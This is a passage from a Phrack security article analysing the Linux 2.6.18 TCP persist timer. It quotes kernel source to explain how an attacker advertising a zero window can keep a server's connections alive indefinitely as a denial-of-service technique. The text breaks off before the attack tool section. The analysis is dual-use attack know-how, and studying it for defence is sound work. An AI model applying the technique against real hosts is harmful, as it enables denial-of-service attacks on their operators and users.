@@ -1,0 +1,3329 @@
+				==Phrack Inc.==
+
+		Volume 0x0d, Issue 0x42, Phile #0x09 of 0x11
+
+|=-----------------------------------------------------------------------=|
+|=--------=[ Exploiting TCP and the Persist Timer Infiniteness ]=--------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[    By ithilgore                      ]=--------------=|
+|=---------------=[       sock-raw.org                   ]=--------------=|
+|=---------------=[                                      ]=--------------=|
+|=---------------=[    ithilgore.ryu.L@gmail.com         ]=--------------=|
+|=-----------------------------------------------------------------------=|
+
+
+---[ Contents
+
+   1 - Introduction
+
+   2 - TCP Persist Timer Theory
+
+   3 - TCP Persist Timer implementation 
+     3.1 - TCP Timers Initialization
+     3.2 - Persist Timer Triggering
+     3.3 - Inner workings of Persist Timer
+
+   4 - The attack
+     4.1 - Kernel memory exhaustion pitfalls
+     4.2 - Attack Vector
+     4.3 - Test cases
+
+   5 - Nkiller2 implementation
+
+   6 - References
+  
+  
+
+
+--[ 1 - Introduction 
+
+TCP is the main protocol upon which most end-to-end communications take
+place, nowadays. Being introduced a lot of years ago, where security
+wasn't as much a concern, has left it with quite a few hanging
+vulnerabilities. It is not strange that many TCP implementations have
+deviated from the official RFCs, to provide additional protective
+measures and robustness. However, there are still attack vectors which
+can be exploited. One of them is the Persist Timer, which is triggered
+when the receiver advertises a TCP window of size 0. In the following
+text, we are going to analyse, how an old technique of kernel memory
+exhaustion [1] can be amplified, extended and adjusted to other forms of
+attacks, by exploiting the persist timer functionality. Our analysis is 
+mainly going to focus on the Linux (2.6.18) network stack implementation,
+but test cases for *BSD will be included as well. The possibility of 
+exploiting the TCP Persist Timer, was first mentioned at [2].
+A proof-of-concept tool that was developed for the sole purpose of
+demonstrating the above attack will be presented. Nkiller2 is able to 
+perform a generic DoS attack, completely statelessly and with almost no 
+memory overhead, using packet-parsing techniques and virtual states. In
+addition, the amount of traffic created is far less than that of similar
+tools, due to the attack's nature. The main advantage, that makes all the
+difference, is the possibly unlimited prolonging of the DoS attack's
+impact by the exploitation of a perfectly 'expected & normal' TCP Persist
+Timer behaviour.
+
+
+
+--[ 2 - TCP Persist Timer theory 
+
+TCP is based on many timers. One of them is the Persist Timer, which is
+used when the peer advertises a window of size 0. Normally, the receiver
+advertises a zero window, when TCP hasn't pushed the buffered data to the
+user application and thus the kernel buffers reach their initial
+advertised limit. This forces the TCP sender to stop writing data to the
+network, until the receiver advertises a window which has a value greater
+than zero. To accomplish that, the receiver sends an ACK called a window
+update, which has the same acknowledgment number as the one that
+advertised the 0 window (since no new data is effectively acknowledged).
+
+The Persist Timer is triggered when TCP gets a 0 window advertisement for
+the following reason: Suppose the receiver eventually pushes the data
+from the kernel buffers to the user application, and thus opens the
+window (the right edge is advanced). He then sends a window update to the
+sender announcing that it can now receive new data. If this window update
+is lost for any reason, then both ends of the connection would deadlock,
+since the receiver would wait for new data and the sender would wait for
+the now lost window update. To avoid the above situation, the sender
+sets the Perist Timer and if no window update has reached him until it
+expires, then he resends a probe to the peer. As long as the receiver
+keeps advertising a window of size 0, then the sender follows the process
+again. He sets the timer, waits for the window update and resends the
+probe. As long as some of the probes are acknowledged, without necessarily
+having to announce a new window, the process will go on ad infinitum.
+Examples can be found at [3].
+
+Of course, the actual implementation is always more complicated than
+theory. We are going to inspect the Linux implementation of the
+TCP Persist Timer, watch the intricacies unfold and eventually get a
+fairly good perspective on what happens behind the scenes.
+
+
+
+-- [ 3 - TCP Persist Timer implementation 
+
+The following code inspection will mainly focus on the implementation of 
+the TCP Persist Timer on Linux 2.6.18. Many of the TCP kernel functions 
+will be regarded as black-boxes, as their analysis is beyond the scope of
+this paper and would probably require a book by itself. 
+
+
+----[ 3.1 - TCP Timer Initialization
+
+Let's see when and how the main TCP timers are initialized. During the
+socket creation process tcp_v4_init_sock() will call 
+tcp_init_xmit_timers() which in turn calls inet_csk_init_xmit_timers().
+
+
+net/ipv4/tcp_ipv4.c:
+/---------------------------------------------------------------------\
+
+/* NOTE: A lot of things set to zero explicitly by call to
+ *       sk_alloc() so need not be done here.
+ */
+static int tcp_v4_init_sock(struct sock *sk)
+{
+    struct inet_connection_sock *icsk = inet_csk(sk);
+    struct tcp_sock *tp = tcp_sk(sk);
+
+    skb_queue_head_init(&tp->out_of_order_queue);
+    tcp_init_xmit_timers(sk);
+    /* ... */
+
+}
+
+\---------------------------------------------------------------------/
+
+
+net/ipv4/tcp_timer.c:
+/---------------------------------------------------------------------\
+
+void tcp_init_xmit_timers(struct sock *sk)
+{
+    inet_csk_init_xmit_timers(sk, &tcp_write_timer, &tcp_delack_timer,
+                  &tcp_keepalive_timer);
+}
+
+\---------------------------------------------------------------------/
+
+
+As we can see, inet_csk_init_xmit_timers() is the function which actually
+does the work of setting up the timers. Essentially what it does, is to
+assign a handler function to each of the three main timers, as instructed
+by its arguments. setup_timer() is a simple inline function defined at
+"include/linux/timer.h".
+
+
+net/ipv4/inet_connection_sock.c:
+/---------------------------------------------------------------------\
+
+/*
+ * Using different timers for retransmit, delayed acks and probes
+ * We may wish use just one timer maintaining a list of expire jiffies
+ * to optimize.
+ */
+void inet_csk_init_xmit_timers(struct sock *sk,
+                   void (*retransmit_handler)(unsigned long),
+                   void (*delack_handler)(unsigned long),
+                   void (*keepalive_handler)(unsigned long))
+{
+    struct inet_connection_sock *icsk = inet_csk(sk);
+
+    setup_timer(&icsk->icsk_retransmit_timer, retransmit_handler,
+            (unsigned long)sk);
+    setup_timer(&icsk->icsk_delack_timer, delack_handler,
+            (unsigned long)sk);
+    setup_timer(&sk->sk_timer, keepalive_handler, (unsigned long)sk);
+    icsk->icsk_pending = icsk->icsk_ack.pending = 0;
+}
+
+\---------------------------------------------------------------------/
+
+
+include/linux/timer.h:
+/---------------------------------------------------------------------\
+
+static inline void setup_timer(struct timer_list * timer,
+                void (*function)(unsigned long),
+                unsigned long data)
+{
+    timer->function = function;
+    timer->data = data;
+    init_timer(timer);
+}
+
+\---------------------------------------------------------------------/
+
+
+According to the above, the timers will be initialized with the following
+handlers:
+
+retransmission timer -> tcp_write_timer()
+delayed acknowledgments timer -> tcp_delack_timer()
+keepalive timer -> tcp_keepalive_timer()
+
+What interests us, is the tcp_write_timer(), since as we can see from the
+following code, *both* the retransmission timer *and* the persist timer
+are initially handled by the same function before triggering the more
+specific ones. And there is a reason that Linux ties the two timers.
+
+
+net/ipv4/tcp_timer.c:
+/---------------------------------------------------------------------\
+
+static void tcp_write_timer(unsigned long data)
+{
+    struct sock *sk = (struct sock*)data;
+    struct inet_connection_sock *icsk = inet_csk(sk);
+    int event;
+
+    bh_lock_sock(sk);
+    if (sock_owned_by_user(sk)) {
+        /* Try again later */
+        sk_reset_timer(sk, &icsk->icsk_retransmit_timer, 
+            jiffies + (HZ / 20));
+        goto out_unlock;
+    }
+
+    if (sk->sk_state == TCP_CLOSE || !icsk->icsk_pending)
+        goto out;
+
+    if (time_after(icsk->icsk_timeout, jiffies)) {
+        sk_reset_timer(sk, &icsk->icsk_retransmit_timer, 
+            icsk->icsk_timeout);
+        goto out;
+    }
+
+    event = icsk->icsk_pending;
+    icsk->icsk_pending = 0;
+
+    switch (event) {
+    case ICSK_TIME_RETRANS:
+        tcp_retransmit_timer(sk);
+        break;
+    case ICSK_TIME_PROBE0:
+        tcp_probe_timer(sk);
+        break;
+    }
+    TCP_CHECK_TIMER(sk);
+
+out:
+    sk_mem_reclaim(sk);
+out_unlock:
+    bh_unlock_sock(sk);
+    sock_put(sk);
+}
+
+\---------------------------------------------------------------------/
+
+
+Depending on the value of 'icsk->icsk_pending', then either the 
+retransmission_timer real handler -tcp_retransmit_timer()- or the 
+persist_timer real handler -tcp_probe_timer()- is called. 
+ICSK_TIME_RETRANS and ICSK_TIME_PROBE0 are literals defined at 
+"include/net/inet_connection_sock.h" and icsk_pending is an 8bit member
+of a type inet_sock struct which is defined in the same file.
+
+
+include/net/inet_connection_sock.h:
+/---------------------------------------------------------------------\
+
+/** inet_connection_sock - INET connection oriented sock
+ *
+ * @icsk_pending:      Scheduled timer event
+ * ...
+ *
+ */
+
+struct inet_connection_sock {
+    /* inet_sock has to be the first member! */
+    struct inet_sock      icsk_inet;
+    /* ... */
+    __u8              icsk_pending;
+
+    /* ...*/
+}
+
+/* ... */
+
+#define ICSK_TIME_RETRANS   1   /* Retransmit timer */
+#define ICSK_TIME_DACK      2   /* Delayed ack timer */
+#define ICSK_TIME_PROBE0    3   /* Zero window probe timer */
+#define ICSK_TIME_KEEPOPEN  4   /* Keepalive timer */
+
+\----------------------------------------------------------------------/
+
+
+Leaving the initialization process behind, we need to see how we can
+trigger the TCP persist timer.
+
+
+----[ 3.2 - Persist Timer Triggering
+
+Looking through the kernel code for functions that trigger/reset the 
+timers, we fall upon inet_csk_reset_xmit_timer() which is defined at
+"include/net/inet_connection_sock.h"
+
+
+include/net/inet_connection_sock.h:
+/---------------------------------------------------------------------\
+
+/*
+ *  Reset the retransmission timer
+ */
+static inline void inet_csk_reset_xmit_timer(struct sock *sk,
+                         const int what,
+                         unsigned long when,
+                         const unsigned long max_when)
+{
+    struct inet_connection_sock *icsk = inet_csk(sk);
+
+    if (when > max_when) {
+#ifdef INET_CSK_DEBUG
+        pr_debug("reset_xmit_timer: sk=%p %d when=0x%lx, 
+            caller=%p\n", sk, what, when, 
+            current_text_addr());
+#endif
+        when = max_when;
+    }
+
+    if (what == ICSK_TIME_RETRANS || what == ICSK_TIME_PROBE0) {
+        icsk->icsk_pending = what;
+        icsk->icsk_timeout = jiffies + when;
+        sk_reset_timer(sk, &icsk->icsk_retransmit_timer,
+                icsk->icsk_timeout);
+    } else if (what == ICSK_TIME_DACK) {
+        icsk->icsk_ack.pending |= ICSK_ACK_TIMER;
+        icsk->icsk_ack.timeout = jiffies + when;
+        sk_reset_timer(sk, &icsk->icsk_delack_timer, 
+                icsk->icsk_ack.timeout);
+    }
+#ifdef INET_CSK_DEBUG
+    else {
+        pr_debug("%s", inet_csk_timer_bug_msg);
+    }
+#endif
+}
+
+\----------------------------------------------------------------------/
+
+
+An assignment to 'icsk->icsk_pending' is made according to the argument
+'what'. Note the ambiguity of the comment mentioning that the
+retransmission timer is reset. Essentially, however, either the persist
+timer or the retransmission can be reset through this function. In
+addition, the delayed acknowledgement timer, which won't interest us, can
+be reset through the ICSK_TIME_DACK value. So, whenever 
+inet_csk_reset_xmit_timer() is called, it sets the corresponding timer,
+as instructed by argument 'what', to fire up after time 'when' (which
+must be less or equal than 'max_when') has passed. jiffies is a global
+variable which shows the current system uptime in terms of clock ticks
+A good reference, on how timers in general are managed, is [4]. 
+A caller function which sets the argument 'what' as ICSK_TIME_PROBE0 is
+tcp_check_probe_timer().
+
+
+include/net/tcp.h:
+/---------------------------------------------------------------------\
+
+static inline void tcp_check_probe_timer(struct sock *sk, 
+                        struct tcp_sock *tp)
+{
+    const struct inet_connection_sock *icsk = inet_csk(sk);
+    if (!tp->packets_out && !icsk->icsk_pending)
+        inet_csk_reset_xmit_timer(sk, ICSK_TIME_PROBE0,
+                      icsk->icsk_rto, TCP_RTO_MAX);
+}
+
+\----------------------------------------------------------------------/
+
+
+We face two problems before the persist timer can be triggered. First we
+need to pass the check of the if condition in tcp_check_probe_timer():
+
+    if (!tp->packets_out && !icsk->icsk_pending)
+
+tp->packets_out denotes if any packets are in flight and have not yet
+been acknowledged. This means that the advertisement of a 0 window must
+happen after any data we have received has been acknowledged by us (as 
+the receiver) and before the sender starts transmitting any new data.
+The fact that icsk->icsk_pending should be, 0 denotes that any other timer
+has to already have been cleared. This can happen through the function
+inet_csk_clear_xmit_timer() which in our case can be called by
+tcp_ack_packets_out() which is called by tcp_clean_rtx_queue() which is
+called by tcp_ack() which is the main function that deals with incoming
+acks. tcp_ack() is called by tcp_rcv_established(), in turn called by
+tcp_v4_do_rcv(). The only limitation again for tcp_ack_packets_out() to
+call the timer clearing function, is that 'tp->packets_out' should be 0.
+
+
+net/include/inet_connection_sock.h
+/---------------------------------------------------------------------\
+
+static inline void inet_csk_clear_xmit_timer(struct sock *sk, 
+                        const int what)
+{
+    struct inet_connection_sock *icsk = inet_csk(sk);
+    
+    if (what == ICSK_TIME_RETRANS || what == ICSK_TIME_PROBE0) {
+        icsk->icsk_pending = 0;
+#ifdef INET_CSK_CLEAR_TIMERS
+        sk_stop_timer(sk, &icsk->icsk_retransmit_timer);
+#endif
+    /* ... */
+}
+
+\----------------------------------------------------------------------/
+
+
+net/ipv4/tcp_input.c
+/---------------------------------------------------------------------\
+
+static void tcp_ack_packets_out(struct sock *sk, struct tcp_sock *tp)
+{
+    if (!tp->packets_out) {
+        inet_csk_clear_xmit_timer(sk, ICSK_TIME_RETRANS);
+    } else {
+        inet_csk_reset_xmit_timer(sk, ICSK_TIME_RETRANS, 
+            inet_csk(sk)->icsk_rto, TCP_RTO_MAX);
+    }
+}
+
+/* ... */
+
+/* Remove acknowledged frames from the retransmission queue. */
+static int tcp_clean_rtx_queue(struct sock *sk, __s32 *seq_rtt_p)
+{
+
+/* ... */
+    if (acked&FLAG_ACKED) {
+        tcp_ack_update_rtt(sk, acked, seq_rtt);
+        tcp_ack_packets_out(sk, tp);
+        /* ... */
+    }
+/* ... */
+
+}
+
+/* ... */
+
+/* This routine deals with incoming acks, but not outgoing ones. */
+static int tcp_ack(struct sock *sk, struct sk_buff *skb, int flag)
+{
+
+/* ... */
+
+    /* See if we can take anything off of the retransmit queue. */
+    flag |= tcp_clean_rtx_queue(sk, &seq_rtt);
+/* ... */
+
+}
+
+\----------------------------------------------------------------------/
+
+
+The only caller for tcp_check_probe_timer() is __tcp_push_pending_frames()
+which has tcp_push_pending_frames as its wrapper function.
+tcp_push_sending_frames() is called by tcp_data_snd_check() which is
+called by tcp_rcv_established() which as we saw above calls tcp_ack() as
+well.
+
+
+include/net/tcp.h:
+/---------------------------------------------------------------------\
+
+void __tcp_push_pending_frames(struct sock *sk, struct tcp_sock *tp,
+                   unsigned int cur_mss, int nonagle)
+{
+    struct sk_buff *skb = sk->sk_send_head;
+
+    if (skb) {
+        if (tcp_write_xmit(sk, cur_mss, nonagle))
+            tcp_check_probe_timer(sk, tp);
+    }
+}
+
+/* ... */
+
+static inline void tcp_push_pending_frames(struct sock *sk,
+                       struct tcp_sock *tp)
+{
+    __tcp_push_pending_frames(sk, tp, tcp_current_mss(sk, 1),
+                    tp->nonagle);
+}
+
+\----------------------------------------------------------------------/
+
+
+Another problem here is that we have to make tcp_write_xmit() return a
+value different than 0. According to the comments and the last line of
+the function, the only way to return 1 is by having no packets
+unacknowledged (which are in flight) and additionally by having more 
+packets that need to be sent on queue. This means that the data we
+requested needs to be larger than the initial mss, so that at least 2
+packets are needed to be sent. The first will be acknowledged by us
+advertising a zero window at the same time, and after that, there will
+still be at least 1 packet left in the sender queue. There is also the
+chance, that we advertise a zero window before the sender even starts
+sending any data, just after the connection establishment phase, but
+we will see later that this is not a really good practice.
+
+
+net/ipv4/tcp_output.c:
+/---------------------------------------------------------------------\
+
+/* This routine writes packets to the network.  It advances the
+ * send_head.  This happens as incoming acks open up the remote
+ * window for us.
+ *
+ * Returns 1, if no segments are in flight and we have queued segments,
+ * but cannot send anything now because of SWS or another problem.
+ */
+static int tcp_write_xmit(struct sock *sk, unsigned int mss_now, 
+                int nonagle)
+{
+    struct tcp_sock *tp = tcp_sk(sk);
+    struct sk_buff *skb;
+    unsigned int tso_segs, sent_pkts;
+    int cwnd_quota;
+    int result;
+
+    /* If we are closed, the bytes will have to remain here.
+     * In time closedown will finish, we empty the write queue and
+     * all will be happy.
+     */
+    if (unlikely(sk->sk_state == TCP_CLOSE))
+        return 0;
+
+    sent_pkts = 0;
+
+    /* Do MTU probing. */
+    if ((result = tcp_mtu_probe(sk)) == 0) {
+        return 0;
+    } else if (result > 0) {
+        sent_pkts = 1;
+    }
+
+    while ((skb = sk->sk_send_head)) {
+        unsigned int limit;
+
+        tso_segs = tcp_init_tso_segs(sk, skb, mss_now);
+        BUG_ON(!tso_segs);
+
+        cwnd_quota = tcp_cwnd_test(tp, skb);
+        if (!cwnd_quota)
+            break;
+
+        if (unlikely(!tcp_snd_wnd_test(tp, skb, mss_now)))
+            break;
+
+        if (tso_segs == 1) {
+            if (unlikely(!tcp_nagle_test(tp, skb, mss_now,
+                (tcp_skb_is_last(sk, skb) ?
+                nonagle : TCP_NAGLE_PUSH))))
+                break;
+        } else {
+            if (tcp_tso_should_defer(sk, tp, skb))
+                break;
+        }
+
+        limit = mss_now;
+        if (tso_segs > 1) {
+            limit = tcp_window_allows(tp, skb,
+                          mss_now, cwnd_quota);
+
+            if (skb->len < limit) {
+                unsigned int trim = skb->len % mss_now;
+
+                if (trim)
+                    limit = skb->len - trim;
+            }
+        }
+
+        if (skb->len > limit &&
+            unlikely(tso_fragment(sk, skb, limit, mss_now)))
+            break;
+
+        TCP_SKB_CB(skb)->when = tcp_time_stamp;
+
+        if (unlikely(tcp_transmit_skb(sk, skb, 1, GFP_ATOMIC)))
+            break;
+
+        /* Advance the send_head.  This one is sent out.
+         * This call will increment packets_out.
+         */
+        update_send_head(sk, tp, skb);
+
+        tcp_minshall_update(tp, mss_now, skb);
+        sent_pkts++;
+    }
+
+    if (likely(sent_pkts)) {
+        tcp_cwnd_validate(sk, tp);
+        return 0;
+    }
+    return !tp->packets_out && sk->sk_send_head;
+}
+
+\----------------------------------------------------------------------/
+
+
+Looking through tcp_write_xmit(), we can deduce that the only way to make
+it return a value different than 0, is by reaching the last line and at
+the same meeting the above two requirements. Consequently, we need to
+break from the while loop before 'sent_pkts' is increased so that the if
+condition which calls tcp_cwnd_validate() and then causes the function
+to return 0, fails the check. The key is these two lines:
+
+        if (unlikely(!tcp_snd_wnd_test(tp, skb, mss_now)))
+            break;
+
+tcp_snd_wnd_test() is defined as follows:
+
+net/ipv4/tcp_output.c
+/---------------------------------------------------------------------\
+
+/* Does at least the first segment of SKB fit into the send window? */
+static inline int tcp_snd_wnd_test(struct tcp_sock *tp, 
+    struct sk_buff *skb, unsigned int cur_mss)
+{
+    u32 end_seq = TCP_SKB_CB(skb)->end_seq;
+
+    if (skb->len > cur_mss)
+        end_seq = TCP_SKB_CB(skb)->seq + cur_mss;
+
+    return !after(end_seq, tp->snd_una + tp->snd_wnd);
+}
+
+\---------------------------------------------------------------------/
+
+
+To clarify a few things, here is an excerpt from tcp.h which defines the
+macro 'after' and the members of struct tcp_skb_cb which are used inside
+tcp_snd_wnd_test(). 
+
+
+include/net/tcp.h:
+/---------------------------------------------------------------------\
+
+/*
+ * The next routines deal with comparing 32 bit unsigned ints
+ * and worry about wraparound (automatic with unsigned arithmetic).
+ */
+
+static inline int before(__u32 seq1, __u32 seq2)
+{
+        return (__s32)(seq1-seq2) < 0;
+}
+#define after(seq2, seq1)   before(seq1, seq2)
+
+/* ... */
+
+struct tcp_skb_cb {
+    union {
+        struct inet_skb_parm    h4;
+#if defined(CONFIG_IPV6) || defined (CONFIG_IPV6_MODULE)
+        struct inet6_skb_parm   h6;
+#endif
+    } header;   /* For incoming frames      */
+    __u32       seq;        /* Starting sequence number */
+    __u32       end_seq;    /* SEQ + FIN + SYN + datalen    */
+    
+    /* ... */
+
+    __u32       ack_seq;    /* Sequence number ACK'd    */
+};
+
+#define TCP_SKB_CB(__skb)   ((struct tcp_skb_cb *)&((__skb)->cb[0]))
+
+\---------------------------------------------------------------------/
+
+
+So, in theory we need the sequence number which is derived from the sum
+of the current sequence number + the datalength, to be more than the sum
+of the number of unacknowledged data + the send window. A diagram from
+RFC 793 helps clear out some things:
+
+                   1         2          3          4      
+              ----------|----------|----------|---------- 
+                     SND.UNA    SND.NXT    SND.UNA        
+                                          +SND.WND        
+
+        1 - old sequence numbers which have been acknowledged  
+        2 - sequence numbers of unacknowledged data            
+        3 - sequence numbers allowed for new data transmission 
+        4 - future sequence numbers which are not yet allowed  
+
+In practice, the fact the we, as receivers, just advertised a window of
+size 0, makes the snd_wnd 0, which in turn leads the above check in
+succeeding. Things just work by themselves here.
+
+For completeness, we mention that the window is updated by calling the
+function tcp_ack_update_window() (caller is tcp_ack()) which in turns
+updates the tp->snd_wnd variable if the window update is a valid one,
+something which is checked by tcp_may_update_window().
+
+
+net/ipv4/tcp_input.c
+/---------------------------------------------------------------------\
+
+/* Check that window update is acceptable.
+ * The function assumes that snd_una<=ack<=snd_next.
+ */
+static inline int tcp_may_update_window(const struct tcp_sock *tp, 
+    const u32 ack, const u32 ack_seq, const u32 nwin)
+{
+    return (after(ack, tp->snd_una) ||
+        after(ack_seq, tp->snd_wl1) ||
+        (ack_seq == tp->snd_wl1 && nwin > tp->snd_wnd));
+}
+
+/* ... */
+
+/* Update our send window.
+ *
+ * Window update algorithm, described in RFC793/RFC1122 (used in 
+ * linux-2.2 and in FreeBSD. NetBSD's one is even worse.) is wrong.
+ */
+static int tcp_ack_update_window(struct sock *sk, struct tcp_sock *tp,
+                 struct sk_buff *skb, u32 ack, 
+                 u32 ack_seq)
+{
+    int flag = 0;
+    u32 nwin = ntohs(skb->h.th->window);
+
+    if (likely(!skb->h.th->syn))
+        nwin <<= tp->rx_opt.snd_wscale;
+
+    if (tcp_may_update_window(tp, ack, ack_seq, nwin)) {
+        flag |= FLAG_WIN_UPDATE;
+        tcp_update_wl(tp, ack, ack_seq);
+
+        if (tp->snd_wnd != nwin) {
+            tp->snd_wnd = nwin;
+            /* ... */
+        }
+    }
+
+    tp->snd_una = ack;
+
+    return flag;
+}
+
+\---------------------------------------------------------------------/
+
+
+Let's now summarize the above with a graphical representation.
+
+attacker <-------- data --------- sender
+attacker ---- ACK(data), win0 --> sender
+
+What happens on the sender side:
+
+tcp_v4_do_rcv()
+   |
+   |--> tcp_rcv_established()
+          |
+          |--> tcp_ack()
+          |       |
+          |       |--> tcp_ack_update_window() 
+          |       |      | 
+          |       |      |--> tcp_may_update_window()
+          |       |      
+          |       |--> tcp_clean_rtx_queue() 
+          |              |
+          |              |--> tcp_ack_packets_out()
+          |                      |
+          |                      |--> inet_csk_clear_xmit_timer()
+          |         
+          |--> tcp_data_snd_check()
+                  |
+                  |--> tcp_push_sending_frames()
+                         |
+                         |--> __tcp_push_sending_frames()
+                                 |
+                                 |--> tcp_write_xmit()
+                                 |      |
+                                 |      |--> tcp_snd_wnd_test()
+                                 |               
+                                 |--> tcp_check_probe_timer()
+                                        |
+                                        |--> inet_csk_reset_xmit_timer()
+
+
+Time to move on to the more specific internals of the TCP Persist Timer
+itself.
+
+
+
+----[ 3.3 - Inner workings of Persist Timer
+
+tcp_probe_timer() is the actual handler for the TCP persist timer so we
+are going to focus on this one for a while.
+
+
+net/ipv4/tcp_timer.c
+/---------------------------------------------------------------------\
+
+static void tcp_probe_timer(struct sock *sk)
+{
+    struct inet_connection_sock *icsk = inet_csk(sk);
+    struct tcp_sock *tp = tcp_sk(sk);
+    int max_probes;
+
+    if (tp->packets_out || !sk->sk_send_head) {
+        icsk->icsk_probes_out = 0;
+        return;
+    }
+
+    /* *WARNING* RFC 1122 forbids this
+     *
+     * It doesn't AFAIK, because we kill the retransmit timer -AK
+     *
+     * FIXME: We ought not to do it, Solaris 2.5 actually has fixing
+     * this behaviour in Solaris down as a bug fix. [AC]
+     *
+     * Let me to explain. icsk_probes_out is zeroed by incoming ACKs
+     * even if they advertise zero window. Hence, connection is killed
+     * only if we received no ACKs for normal connection timeout. It is
+     * not killed only because window stays zero for some time, window
+     * may be zero until armageddon and even later. We are in full
+     * accordance with RFCs, only probe timer combines both
+     * retransmission timeout and probe timeout in one bottle.  --ANK
+     */
+    max_probes = sysctl_tcp_retries2;
+
+    if (sock_flag(sk, SOCK_DEAD)) {
+        const int alive = ((icsk->icsk_rto << icsk->icsk_backoff)
+            < TCP_RTO_MAX);
+ 
+        max_probes = tcp_orphan_retries(sk, alive);
+
+        if (tcp_out_of_resources(sk, alive || icsk->icsk_probes_out
+            <= max_probes))
+            return;
+    }
+
+    if (icsk->icsk_probes_out > max_probes) {
+        tcp_write_err(sk);
+    } else {
+        /* Only send another probe if we didn't close things up. */
+        tcp_send_probe0(sk);
+    }
+}
+
+\---------------------------------------------------------------------/
+
+
+Commenting on the comments, we stand before a kernel developer
+disagreement on whether or not the implementation deviates from RFC 1122
+(Requirements for Internet Hosts - Communication Layers). The most 
+outstanding point, however, is this remark:
+
+    "It is not killed only because window stays zero for some time, 
+    window may be zero until armageddon and even later."
+
+Indeed, this is part of what we are going to exploit. We shall take
+advantage of a perfectly 'normal' TCP behaviour, for our own purpose.
+Let's see how this works: 'max_probes' is assigned the value of
+'sysctl_tcp_retries2' which is actually a userspace-controlled variable
+from /proc/sys/net/ipv4/tcp_retries2 and which usually defaults to 15.
+
+There are two cases from now on.
+First case: SOCK_DEAD -> The socket is "dead" or "orphan" which usually
+happens when the state of the connection is FIN_WAIT_1 or any other 
+terminating state from the TCP state transition diagram (RFC 793).
+In this case, 'max_probes' gets the value from tcp_orphan_retries() which
+is defined as follows:
+
+
+net/ipv4/tcp_timer.c:
+/---------------------------------------------------------------------\
+
+/* Calculate maximal number or retries on an orphaned socket. */
+static int tcp_orphan_retries(struct sock *sk, int alive)
+{
+    int retries = sysctl_tcp_orphan_retries; /* May be zero. */
+
+    /* We know from an ICMP that something is wrong. */
+    if (sk->sk_err_soft && !alive)
+        retries = 0;
+
+    /* However, if socket sent something recently, select some safe
+     * number of retries. 8 corresponds to >100 seconds with minimal
+     * RTO of 200msec. */
+    if (retries == 0 && alive)
+        retries = 8;
+    return retries;
+
+\---------------------------------------------------------------------/
+
+
+The 'alive' variable is calculated from this line:
+
+        const int alive = ((icsk->icsk_rto << icsk->icsk_backoff)
+            < TCP_RTO_MAX);
+
+TCP_RTO_MAX is the maximum value the retransmission timeout can get
+and is defined at:
+
+
+include/net/tcp.h:
+/---------------------------------------------------------------------\
+
+#define TCP_RTO_MAX ((unsigned)(120*HZ))
+
+\---------------------------------------------------------------------/
+
+
+HZ is the tick rate frequency of the system, which means a period of
+1/HZ seconds is assumed. Regardless of the value of HZ (which is
+varies from one architecture to another), anything that is multiplied
+by it, is transformed to a product of seconds [4]. For example, 120*HZ is
+translated to 120 seconds since we are going to have HZ timer interrupts
+per second.
+
+Consequently, if the retransmission timeout is less than the maximum 
+allowed value of 2 minutes, then 'alive' = 1 and tcp_orphan_retries will
+return 8, even if sysctl_tcp_orphan_retries is defined as 0 (which is
+usually the case as one can see from the proc virtual filesystem:
+/proc/sys/net/ipv4/tcp_orphan_retries). Keep in mind, however that the RTO
+(retransmission timeout) is a dynamically computed value, varying when,
+for example, traffic congestion occurs.
+
+Practically, the case of a socket being dead is when the user application
+has been requested a small amount of data from the peer. It can then write
+the data all at once and issue a close(2) on the socket. This will result
+on a transition from TCP_ESTALISHED to TCP_FIN_WAIT_1. Normally and
+according to RFC 793, the state FIN_WAIT_1 automatically involves sending
+a FIN (doing an active close) to the peer. However Linux breaks the
+official TCP state machine, and will queue this small amount of data,
+sending the FIN only when all of it has been acknowledged.
+
+
+net/ipv4/tcp.c:
+/---------------------------------------------------------------------\
+
+void tcp_close(struct sock *sk, long timeout)
+{
+/* ... */
+        
+        /* RED-PEN. Formally speaking, we have broken TCP state
+         * machine. State transitions:
+         *
+         * TCP_ESTABLISHED -> TCP_FIN_WAIT1
+         * TCP_SYN_RECV -> TCP_FIN_WAIT1 (forget it, it's impossible)
+         * TCP_CLOSE_WAIT -> TCP_LAST_ACK
+         *
+         * are legal only when FIN has been sent (i.e. in window),
+         * rather than queued out of window. Purists blame.
+         *
+         * F.e. "RFC state" is ESTABLISHED,
+         * if Linux state is FIN-WAIT-1, but FIN is still not sent.
+
+         * F.e. "RFC state" is ESTABLISHED,
+         * if Linux state is FIN-WAIT-1, but FIN is still not sent.
+         * ...
+         */
+/* ... */
+}
+
+\---------------------------------------------------------------------/
+
+
+Second Case: socket not dead -> in this case 'max_probes' keeps having
+the default value from 'tcp_retries2'. 
+
+'icsk->icsk_probes_out' stores the number of zero window probes so far.
+Its value is compared to 'max_probes' and if greater, tcp_write_err()
+is called, which will shutdown the corresponding socket (TCP_CLOSE state).
+If not, then a zero window probe is sent with tcp_send_probe0().
+
+    if (icsk->icsk_probes_out > max_probes) {
+        tcp_write_err(sk);
+    } else {
+        /* Only send another probe if we didn't close things up. */
+        tcp_send_probe0(sk);
+
+One important factor here is the 'icsk_probes_out' "regeneration" which
+takes place whenever we send an ACK, regardless of whether this ACK
+opens the window or keeps it zero. tcp_ack() from tcp_input.c has a 
+line which assigns 0 to 'icsk_probes_out': 
+
+    no_queue:
+        icsk->icsk_probes_out = 0;
+
+
+We mentioned earlier that the TCP Retransmission Timer functionality is
+loosely tied to the Persist Timer. Indeed, the connecting "circle" between
+them is the 'tcp_retries2' variable. Also, remember the comment from
+above:
+
+    /* ...
+     * We are in full accordance with RFCs, only probe timer combines both
+     * retransmission timeout and probe timeout in one bottle.  --ANK
+     */
+
+tcp_retransmit_timer() calls tcp_write_timeout(), as part of it's checking
+procedures, which in turns follows a logic similar to the one we saw above
+in the Persist Timer paradigm. We can see that 'tcp_retries2' plays a
+major role here, too. 
+
+
+net/ipv4/tcp_timer.c:
+/---------------------------------------------------------------------\
+
+/*
+ *  The TCP retransmit timer.
+ */
+
+static void tcp_retransmit_timer(struct sock *sk)
+{
+/* ... */
+`
+    if (tcp_write_timeout(sk))
+        goto out;
+/* ... */
+}
+
+/* ... */
+
+/* A write timeout has occurred. Process the after effects. */
+static int tcp_write_timeout(struct sock *sk)
+{
+    /* ... */
+
+    retry_until = sysctl_tcp_retries2;
+        if (sock_flag(sk, SOCK_DEAD)) {
+            const int alive = (icsk->icsk_rto < TCP_RTO_MAX);
+ 
+            retry_until = tcp_orphan_retries(sk, alive);
+
